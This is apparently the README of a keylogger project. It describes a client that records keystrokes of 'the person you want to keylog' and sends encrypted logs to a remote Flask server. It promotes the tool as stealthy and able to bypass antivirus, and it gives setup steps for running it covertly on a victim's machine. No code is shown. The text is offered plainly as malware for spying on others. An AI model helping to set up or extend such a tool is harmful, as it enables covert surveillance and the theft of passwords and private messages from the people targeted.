# Keylogger Project by @rx0mly (stealthy and bypasses anti virus)
## This requires key generating and server hosting knowledge.

Structure:
- client: keylogger for the person you want to keylog
- server: Flask server to add logs in `logs.txt`

Setup:
1. Generate key with Fernet
2. Change REMOTE_URL in client/keylogger.py
3. Run server/server.py on your server like `http://127.0.0.1:5000`
4. Run client/keylogger.py on the person you want to keylog
